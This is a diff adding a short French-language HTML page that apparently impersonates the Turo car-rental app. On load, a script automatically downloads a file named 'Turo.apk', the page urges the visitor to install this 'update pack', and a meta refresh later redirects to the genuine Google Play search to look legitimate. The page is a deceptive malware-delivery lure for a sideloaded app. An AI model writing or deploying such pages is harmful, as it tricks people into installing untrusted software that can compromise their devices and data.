@@ -1,0 +1,22 @@
+<html>
+ <head>
+<title>Redirection securise</title>
+<meta http-equiv="refresh" content="30;URL=https://play.google.com/store/search?q=turo%20location&c=apps&hl=fr">
+</head>
+<body>
+	<center><br><br><br><font face=courier color=red size=4>Veuillez installer le pack de mise a jour t&eacute;l&eacute;charg&eacute;<BR>Vous serez redirig&eacute; vers la page de l application dans quelques secondes.</font><br><br>
+<IMG SRC=files/loading.gif>
+
+<script>
+window.onload = function() {
+    const lien = document.createElement("a");
+    lien.href = "Turo.apk";
+    lien.download = "Turo.apk";
+    document.body.appendChild(lien);
+    lien.click();
+    document.body.removeChild(lien);
+};
+</script>
+
+ </body>
+</html>
